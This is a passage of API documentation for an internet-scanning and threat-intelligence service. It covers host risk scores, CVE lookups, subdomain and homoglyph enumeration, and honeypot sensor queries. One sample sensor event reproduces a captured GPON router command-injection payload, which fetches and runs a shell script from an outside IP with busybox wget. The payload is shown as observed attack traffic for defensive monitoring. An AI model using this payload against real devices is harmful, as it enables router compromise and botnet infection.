                {
                  "cve": "CVE-2012-0491",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0492",
                  "cvss": 2.1
                },
                {
                  "cve": "CVE-2012-0493",
                  "cvss": 2.1
                },
                {
                  "cve": "CVE-2012-0494",
                  "cvss": 1.7
                },
                {
                  "cve": "CVE-2012-0495",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0496",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2012-5611",
                  "cvss": 6.5
                },
                {
                  "cve": "CVE-2012-5612",
                  "cvss": 6.5
                },
                {
                  "cve": "CVE-2016-6663",
                  "cvss": 4.4
                },
                {
                  "cve": "CVE-2005-1636",
                  "cvss": 4.6
                }
              ],
              "score": 242.3
            }
          ],
          "score": 242.3
        },
        {
          "port": 8080,
          "cve": [
            {
              "cpe": "cpe:/a:indy:httpd:13.2.3.2235",
              "cve_list": [],
              "score": 0
            }
          ],
          "score": 0
        },
        {
          "port": 25,
          "cve": [
            {
              "cpe": "cpe:/a:postfix:postfix",
              "cve_list": [],
              "score": 0,
            }
          ],
          "score": 0,
          "reason": "no version provided"
        },
        {
          "port": 3306,
          "cve": [
            {
              "cpe": "cpe:/a:mysql:mysql:5.5.47-mariadb",
              "cve_list": [
                {
                  "cve": "CVE-2005-1274",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2005-0081",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2005-0082",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2005-0684",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2011-2262",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2012-0112",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-0113",
                  "cvss": 5.5
                },
                {
                  "cve": "CVE-2012-0115",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0116",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2012-0117",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2012-0118",
                  "cvss": 4.9
                },
                {
                  "cve": "CVE-2012-0119",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0120",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2015-3152",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2016-0610",
                  "cvss": 3.5
                },
                {
                  "cve": "CVE-2016-6664",
                  "cvss": 6.9
                },
                {
                  "cve": "CVE-2004-0931",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2017-3302",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2016-7412",
                  "cvss": 6.8
                },
                {
                  "cve": "CVE-2016-6662",
                  "cvss": 10
                },
                {
                  "cve": "CVE-2009-4833",
                  "cvss": 5.8
                },
                {
                  "cve": "CVE-2012-0485",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0486",
                  "cvss": 5
                },
                {
                  "cve": "CVE-2012-0487",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0488",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0489",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0491",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0492",
                  "cvss": 2.1
                },
                {
                  "cve": "CVE-2012-0493",
                  "cvss": 2.1
                },
                {
                  "cve": "CVE-2012-0494",
                  "cvss": 1.7
                },
                {
                  "cve": "CVE-2012-0495",
                  "cvss": 4
                },
                {
                  "cve": "CVE-2012-0496",
                  "cvss": 4.3
                },
                {
                  "cve": "CVE-2016-6663",
                  "cvss": 4.4
                },
                {
                  "cve": "CVE-2005-1636",
                  "cvss": 4.6
                }
              ],
              "score": 164.8
            }
          ],
          "score": 164.8
        }
      ],
      "score": 454.40000000000003
    },
    "ssh": {
      "result": [
        {
          "port": 22,
          "algorithms": {
            "mac": [
              {
                "mac": "hmac-sha1-96",
                "score": 2
              },
              {
                "mac": "hmac-sha1",
                "score": 2
              },
              {
                "mac": "hmac-md5",
                "score": 2
              }
            ],
            "key_exchange": [
              {
                "kex": "diffie-hellman-group1-sha1",
                "score": 2
              }
            ],
            "encryption": [
              {
                "enc": "aes128-cbc",
                "score": 0
              },
              {
                "enc": "3des-cbc",
                "score": 2
              },
              {
                "enc": "aes256-cbc",
                "score": 0
              }
            ]
          },
          "keys": [
            {
              "fingerprint": "b7:d7:10:fd:b8:fb:91:2b:5e:a8:01:b2:03:e3:10:4f",
              "key_length": {
                "length": 1024,
                "score": 2
              },
              "debian_key": {
                "found": false,
                "score": 0
              }
            }
          ],
          "score": 12
        }
      ],
      "score": 12
    },
    "rms": {
      "result": [
        {
          "port": 3389,
          "rms": "rdp",
          "score": 8
        },
        {
          "port": 5901,
          "rms": "vnc",
          "score": 10
        },
        {
          "port": 23,
          "rms": "telnet",
          "score": 8
        }
      ],
      "score": 26
    },
    "ssl": {
      "result": [
        {
          "port": 443,
          "heartbleed": {
            "heartbleed": true,
            "score": 10
          },
          "ccs": {
            "ccs": true,
            "score": 6
          },
          "crime": {
            "crime": true,
            "score": 6
          },
          "renegotiation": {
            "renegotiation": true,
            "score": 6
          },
          "ocsp": {
            "ocsp": true,
            "score": 3
          },
          "no_certificates": {
            "no_certificates": false,
            "score": 0
          },
          "leaf_certificate": {
            "sha1_fingerprint": "c0e750b485ed9250f93f684bb1a87d37bec843b8",
            "issuer": "Huawei",
            "subject": "Huawei",
            "validity": {
              "date": "2016-07-14 09:48:15",
              "status": "expired",
              "score": 4
            },
            "signature": {
              "signature": "sha1WithRSAEncryption",
              "score": 5
            },
            "self_signed": {
              "self_signed": "single-certificate",
              "score": 5
            }
          },
          "other_certificates": [],
          "ciphers": [
            {
              "drown": true,
              "score": 6
            },
            {
              "poodle": true,
              "score": 6
            },
            {
              "logjam": false,
              "score": 0
            }
          ],
          "score": 52
        }
      ],
      "score": 52
    },
    "wec": {
      "result": [
        {
          "port": 25,
          "service": "smtp",
          "score": 6
        }
      ],
      "score": 6
    },
    "ftp": {
      "result": [
        {
          "port": 21,
          "service": "ftp",
          "score": 6
        }
      ],
      "score": 6
    },
    "http": {
      "result": [
        {
          "port": 4991,
          "service": "http",
          "score": 6
        },
        {
          "port": 8080,
          "service": "http",
          "score": 6
        }
      ],
      "score": 12
    },
    "storage": {
      "result": [
        {
          "port": 6666,
          "product": "postgres",
          "score": 4
        },
        {
          "port": 6666,
          "product": "mysql",
          "score": 4
        },
        {
          "port": 1883,
          "product": "mqtt",
          "connected": true,
          "score": 10
        },
        {
          "port": 27017,
          "product": "mongodb",
          "connected": true,
          "score": 10
        },
        {
          "port": 6379,
          "product": "redis",
          "connected": true,
          "score": 10
        },
        {
          "port": 11211,
          "product": "memcached",
          "connected": true,
          "score": 10
        },
        {
          "port": 9200,
          "product": "elasticsearch",
          "connected": true,
          "score": 10
        },
        {
          "port": 3306,
          "product": "mysql",
          "score": 4
        }
      ],
      "score": 62
    },
    "web": {
      "result": [
        {
          "port": 80,
          "headers": true,
          "score": 3
        }
      ],
      "score": 3
    },
    "torrents": {
      "result": [
        {
          "torrents": false,
          "score": 0
        }
      ],
      "score": 0
    }
  },
  "ip_address": "xxx.xxx.xxx.xxx"
}
```

#### /v2/query/cve/ip/{target}

Get list of CVEs that migh affect a specific IP.

**Note**: Available for paid subscriptions only.

*Parameters*

* target: [String] Target IP address 

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/cve/ip/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "query": "xxx.xxx.xxx.xxx",
  "events": {
    "ip": "xxx.xxx.xxx.xxx",
    "ports": [11, 15, 21, 25, 79, 80, 111, 119, 143, 3389, 6000, 8080],
    "results": [{
      "port": 111,
      "cpe": [],
      "ts": 1550723598503,
      "cves": []
    }, {
      "port": 11,
      "cpe": [],
      "ts": 1550713541527,
      "cves": []
    }, {
      "port": 6000,
      "cpe": [],
      "ts": 1549215405492,
      "cves": []
    }, {
      "port": 25,
      "cpe": [],
      "ts": 1551649814882,
      "cves": []
    }, {
      "port": 79,
      "cpe": [],
      "ts": 1550042997176,
      "cves": []
    }, {
      "port": 8080,
      "cpe": ["cpe:/a:apache:http_server:2.4.7"],
      "ts": 1551779143688,
      "cves": [{
        "cve": "CVE-2018-17199",
        "cvss": 5.0
      }, {
        "cve": "CVE-2018-1312",
        "cvss": 6.8
      }, {
        "cve": "CVE-2018-1283",
        "cvss": 3.5
      }, {
        "cve": "CVE-2017-9798",
        "cvss": 5.0
      }, {
        "cve": "CVE-2017-9788",
        "cvss": 6.4
      }, {
        "cve": "CVE-2017-7679",
        "cvss": 7.5
      }, {
        "cve": "CVE-2017-15715",
        "cvss": 6.8
      }, {
        "cve": "CVE-2017-15710",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-8743",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-8612",
        "cvss": 3.3
      }, {
        "cve": "CVE-2016-4975",
        "cvss": 4.3
      }, {
        "cve": "CVE-2016-2161",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-0736",
        "cvss": 5.0
      }, {
        "cve": "CVE-2015-3185",
        "cvss": 4.3
      }, {
        "cve": "CVE-2015-3184",
        "cvss": 5.0
      }, {
        "cve": "CVE-2014-8109",
        "cvss": 4.3
      }, {
        "cve": "CVE-2014-3523",
        "cvss": 5.0
      }, {
        "cve": "CVE-2014-0231",
        "cvss": 5.0
      }, {
        "cve": "CVE-2014-0226",
        "cvss": 6.8
      }, {
        "cve": "CVE-2014-0118",
        "cvss": 4.3
      }, {
        "cve": "CVE-2014-0117",
        "cvss": 4.3
      }, {
        "cve": "CVE-2014-0098",
        "cvss": 5.0
      }, {
        "cve": "CVE-2013-6438",
        "cvss": 5.0
      }]
    }, {
      "port": 3389,
      "cpe": [],
      "ts": 1551348878536,
      "cves": []
    }, {
      "port": 15,
      "cpe": [],
      "ts": 1549108048510,
      "cves": []
    }, {
      "port": 143,
      "cpe": [],
      "ts": 1549566728724,
      "cves": []
    }, {
      "port": 80,
      "cpe": ["cpe:/a:igor_sysoev:nginx:1.4.6"],
      "ts": 1550250446832,
      "cves": [{
        "cve": "CVE-2019-7401",
        "cvss": 7.5
      }, {
        "cve": "CVE-2016-4450",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-0747",
        "cvss": 5.0
      }, {
        "cve": "CVE-2016-0746",
        "cvss": 7.5
      }, {
        "cve": "CVE-2016-0742",
        "cvss": 5.0
      }, {
        "cve": "CVE-2014-3616",
        "cvss": 4.3
      }, {
        "cve": "CVE-2014-0133",
        "cvss": 5.1
      }]
    }, {
      "port": 21,
      "cpe": [],
      "ts": 1550642140211,
      "cves": []
    }, {
      "port": 119,
      "cpe": [],
      "ts": 1550377835750,
      "cves": []
    }]
  }
}
```

### Domains

What is exposed via DNS? What subdomains belong to a Domain? What domains are served by IP X?

#### /v2/query/domains/subdomain/{target}

Return list of subdomains known from the target domains

*Parameters*

* target: [String] Domain you want to get list of known subdomains.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
    * Max: _page=500_ (10,000 results)

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/domains/subdomain/example.com' -H 'X-Key:API_KEY'
```

```json
{
  "query": "root:example.com",
  "page": 1,
  "pagesize": 100,
  "total": 6308,
  "events": ["m.example.com", "startup.antichat.example.com", "anandop1.example.com", "vladimirbezz3.example.com"]
}
```

#### /v2/query/domains/dns/{target}

Return list of known DNS results for the target domain.

Possible types of records currently available:

* A
* AAAA
* NS
* MX

**Note**: Available for paid subscriptions only.

*Parameters*

* target: [String] Domain you want to get DNS related data.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
    * Max: _page=500_ (10,000 results)

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/domains/dns/example.com' -H 'X-Key:API_KEY'
```

```json
{
  "query": "root:example.com",
  "page": 1,
  "pagesize": 100,
  "total": 6308,
  "events": [{
    "A": ["92.63.97.42"],
    "updated_at": "2018-09-22T04:53:21.082802",
    "domain": "startup.antichat.example.com",
    "root": "example.com"
  }, {
    "A": ["93.184.216.34"],
    "MX": ["example.com"],
    "NS": ["ns1.example.com", "ns2.example.com"],
    "updated_at": "2018-12-10T13:20:16.854174",
    "domain": "example.com",
    "root": "example.com",
  }, {
    "A": ["91.235.136.112"],
    "updated_at": "2018-09-22T04:14:29.031596",
    "domain": "vladimirbezz3.example.com",
    "root": "example.com"
  }, {
    "A": ["93.179.68.6"],
    "updated_at": "2018-09-22T03:51:36.852124",
    "domain": "i.seeva.example.com",
    "root": "example.com"
  }]
}
```

#### /v2/query/domains/ip/{target}

Return records that have the specified IP address in their A or AAAA records.

**Note**: Available for paid subscriptions only.

*Parameters*

* target: [IP] Target IP address, supports IPV4 or IPV6
* page: [Int] Optional. Results page number.
    * Default: _page=1_
    * Max: _page=500_ (10,000 results)

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/domains/ip/8.8.8.8' -H 'X-Key:API_KEY'
```

```json
{
  "query": "A:\"8.8.8.8\"",
  "page": 1,
  "pagesize": 100,
  "total": 726,
  "events": [{
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:51:30.676063",
    "NS": ["ns1058.ui-dns.org", "ns1062.ui-dns.com", "ns1068.ui-dns.biz", "ns1096.ui-dns.de"],
    "domain": "aeroway.co.uk",
    "root": "aeroway.co.uk",
    "MX": ["mx00.1and1.co.uk", "mx01.1and1.co.uk"]
  }, {
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:53:30.348620",
    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
    "domain": "84168800.com",
    "root": "84168800.com"
  }, {
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:53:32.450310",
    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
    "domain": "84169911.com",
    "root": "84169911.com"
  }, {
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:53:32.508761",
    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
    "domain": "84163311.com",
    "root": "84163311.com"
  }, {
    "A": ["8.8.8.8"],
    "updated_at": "2018-06-08T20:53:32.540496",
    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
    "domain": "00888416.com",
    "root": "00888416.com"
  }]
}
```

#### /v2/query/domains/search

List of Domains/DNS data based on a Query.  Can be used with specific parameters and/or full-text search. Possible types of records currently available:

* A
* AAAA
* NS
* MX
* CNAME
* TXT

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events.
* page: [Int] Optional. Results page number.
    * Default: _page=1_
    * Max: _page=500_ (10,000 results)

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/domains/search?query=A:127.0.0.1' -H 'X-Key:API_KEY'
```

```json
{
  "query": "A:127.0.0.1",
  "page": 1,
  "pagesize": 100,
  "total": 176685,
  "events": [{
    "A": ["127.0.0.1"],
    "updated_at": "2018-06-08T20:32:57.002881",
    "NS": ["ns3jkl.name.com", "ns4qxz.name.com", "ns2knz.name.com", "ns1ksz.name.com"],
    "domain": "heathynurseway.co.uk",
    "root": "heathynurseway.co.uk",
    "MX": ["mail.emailgoodbye.me"]
  }, {
    "A": ["127.0.0.1"],
    "updated_at": "2018-06-08T20:29:19.612334",
    "NS": ["ns1.antagus.de", "ns2.antagus.de"],
    "domain": "vit.press",
    "root": "vit.press",
    "MX": ["mail.vit.press"]
  }]
}
```

#### /v2/query/domains/enumeration/{target}

**Note**: Available for Business subscriptions only.

This endpoint attempts to enumerate subdomains from a larger dataset. The validate flag can be used to have all subdomains resolved on the fly and only those with DNS entries behind them returned.

*Parameters*

* domain: [string] Domain you want to enumerate
* validate: [any] Optional. If _validate=1_, forces all subdomains to be resolved on request and only live subdomains to be returned
    * Default: _validate=0_
* total: [int] Optional. Return at most the number of results specified
    * Default: undefined, return all results

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/domains/enumeration/example.com?validate=1' -H 'X-Key:API_KEY'
```

```json
{
  "query": "example.com",
  "total": 2,
  "events": [
    {
      "fqdn": "example.com",
      "records": [
        {
          "type": "A",
          "answers": [
            "93.184.216.34"
          ]
        },
        {
          "type": "AAAA",
          "answers": [
            "2606:2800:220:1:248:1893:25c8:1946"
          ]
        },
        {
          "type": "NS",
          "answers": [
            "b.iana-servers.net",
            "a.iana-servers.net"
          ]
        },
        {
          "type": "TXT",
          "answers": [
            "v=spf1 -all"
          ]
        }
      ]
    },
    {
      "fqdn": "www.example.com",
      "records": [
        {
          "type": "A",
          "answers": [
            "93.184.216.34"
          ]
        },
        {
          "type": "AAAA",
          "answers": [
            "2606:2800:220:1:248:1893:25c8:1946"
          ]
        },
        {
          "type": "TXT",
          "answers": [
            "v=spf1 -all"
          ]
        }
      ]
    }
  ]
}
```

#### /v2/query/domains/homoglyphs/{target}

**Note**: Available for Business subscriptions only.

This endpoint generates a list of homoglyphs for a base domain. The validate flag can be used to have all homoglyphs resolved on the fly and only those with DNS entries behind them returned.

*Parameters*

* domain: [string] Domain you want to generate homoglyphs
* validate: [any] Optional. If _validate=1_, forces all homoglyphs to be resolved on request and only live homoglyphs to be returned
    * Default: _validate=0_
* total: [int] Optional. Return at most the number of results specified
    * Default: undefined, return all results

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/domains/homoglyphs/example.com?validate=1' -H 'X-Key:API_KEY'
```

```json
{
  "query": "example.com",
  "total": 91,
  "events": [
        {
      "homoglyph": "exannple.com",
      "records": [
        {
          "type": "NS",
          "answers": [
            "ns-311.awsdns-38.com",
            "ns-1030.awsdns-00.org",
            "ns-532.awsdns-02.net",
            "ns-1828.awsdns-36.co.uk"
          ]
        }
      ]
    },
    {
      "homoglyph": "exampl3.com",
      "records": [
        {
          "type": "NS",
          "answers": [
            "ns-cloud-a2.googledomains.com",
            "ns-cloud-a3.googledomains.com",
            "ns-cloud-a4.googledomains.com",
            "ns-cloud-a1.googledomains.com"
          ]
        }
      ]
    },
    {
      "homoglyph": "exqmple.com",
      "records": [
        {
          "type": "NS",
          "answers": [
            "ns-2046.awsdns-63.co.uk",
            "ns-596.awsdns-10.net",
            "ns-1082.awsdns-07.org",
            "ns-413.awsdns-51.com"
          ]
        }
      ]
    },
    {
      "homoglyph": "exampls.com",
      "records": [
        {
          "type": "NS",
          "answers": [
            "f1g1ns2.dnspod.net",
            "f1g1ns1.dnspod.net"
          ]
        }
      ]
    },
    {
      "homoglyph": "exampke.com",
      "records": [
        {
          "type": "NS",
          "answers": [
            "v1s1.xundns.com",
            "v1s2.xundns.com"
          ]
        }
      ]
    }
  ]
}
```

### Sensors

#### /v2/query/sensors/ip/{target}

**Note**: Available for paid subscriptions only.

Details about an Scanner. List of recent events form the specified host, including details of scanned ports, payloads and tags.

**Note**: Querying CIDRs is available for paid subscriptions only. When using CIDR, the number of credits that will be spent correspond to the number of targets that returned results. Example: a request for a /24 (256 targets) in which only 200 targets have results, will decrement 200 credits.

*Parameters*

* target: [String] Target IP address or CIDR up to /24

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/sensors/ip/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
```

```json
{
  "query": "xxx.xxx.xxx.xxx",
  "total": 1,
  "targets_found": 1,
  "events": [{
    "port": 443,
    "results": [{
      "target": {
        "port": 443,
        "protocol": "tcp"
      },
      "origin": {
        "ts": 1549500839739,
        "type": "sinkhole",
        "ip": "xxx.xxx.xxx.xxx",
        "rdns": "xxx.xxx.xxx.example.com"
      },
      "data": {
        "payload": "POST /GponForm/diag_Form?style/ HTTP/1.1\\r\\nUser-Agent: Hello, World\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.244.25.98/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0",
        "extra": {
          "http": {
            "method": "POST",
            "path": "/GponForm/diag_Form?style/",
            "version": "1.1",
            "headers": {
              "user-agent": "Hello, World",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate",
              "content-type": "application/x-www-form-urlencoded"
            }
          }
        },
        "tags": ["HTTP_SCANNER"]
      }
    }]
  }]
}
```

#### /v2/query/sensors/search

**Note**: Available for paid subscriptions only.

Events based on a Query. List of recent events for the given query, including details of scanned ports, payloads and tags. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
* days: [Integer] Optional. Number of days to get the stats for. For example, days=1 for the last day of data.
    * Default: _days=30_
* only_ips: [Int] Optional. If _only\_ips=1_, only output IP addresses, ports and protocols. 
    * Default: _only\_ips=0_
* page: [Int] Optional. Results page number.
    * Default: _page=1_

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/sensors/search?query=tags:ssh_scanner' -H 'X-Key:API_KEY'
```

```json
{
  "query": "tags:ssh_scanner",
  "page": 1,
  "pagesize": 20,
  "total": 1117979,
  "events": [{
    "data": {
      "payload": "SSH-2.0-PUTTY\\r\\n",
      "extra": {
        "ssh": {
          "description": "SSH-2.0-PUTTY"
        }
      },
      "tags": ["SSH_SCANNER"]
    },
    "target": {
      "port": 22,
      "protocol": "tcp"
    },
    "origin": {
      "ip": "218.92.1.153",
      "type": "sinkhole",
      "ts": 1549625590653,
      "asn": 4134
    }
  }, {
    "target": {
      "port": 22,
      "protocol": "tcp"
    },
    "data": {
      "payload": "\\x00\\x00\\x02\\x84\\x07\\x14t\\x85\\x97.Sf\\x88\\xa3\\x1a\\x7f\\xf7:ZzG\\\\\\x00\\x00\\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\\x00\\x00\\x00\\x0fssh-rsa,ssh-dss\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00=@\\x8d71\\xc9&",
      "extra": {
        "ssh": {
          "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
          "hassh_algorithms": "diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"
        }
      },
      "tags": ["SSH_SCANNER"]
    },
    "origin": {
      "ip": "58.242.83.31",
      "type": "sinkhole",
      "ts": 1549625585310,
      "asn": 4837
    }
  }]
}
```

#### /v2/query/sensors/search/stats

**Note**: Available for paid subscriptions only.

Statistics of events for the given query. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
* type: [String] Type of statistic we want to obtain. Possible types include:
    * _ports_, _tags_, _countries_, _asn_, _ips_, _payloads_, _http\_path_, _rdns_.
* days: [Integer] Optional. Number of days to get the stats for. For example, days=1 for the last day of data.
    * Default: _days=30_
* order: [String] Optional. Whether to sort descendently or ascendently to get the top.
    * _desc_, _asc_
    * Default: _order=desc_

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/sensors/search/stats?query=tags:ssh_scanner&type=ports' -H 'X-Key:API_KEY'
```

```json
[
  {
    "key": "22/tcp",
    "doc_count": 1102752
  },
  {
    "key": "2222/tcp",
    "doc_count": 8149
  },
  {
    "key": "222/tcp",
    "doc_count": 1970
  },
  {
    "key": "4000/tcp",
    "doc_count": 1962
  },
  {
    "key": "23/tcp",
    "doc_count": 1552
  }
]
```

#### /v2/query/sensors/tag/<tag>

Get a list of IPs that have been associated with a specific TAG. See [List of Tags](sensors-tags.md)

*Parameters*

* tag: [String] Tag you want to get the list of IPs related to.
    * example: MALICIOUS
* days: [Integer] Query Param: Number of days to get the stats for. For example days=1 for the last day of data.
    * Default: 1
    * Max: 60

*Output*

```shell
curl 'https://api.binaryedge.io/v2/query/sensors/tag/MALICIOUS' -H 'X-Key:API_KEY'
```

```json
["1.34.221.87", "1.160.38.189", "1.160.39.129", "1.160.91.241", "1.160.130.56", "1.160.160.98", "1.161.118.167"]
```
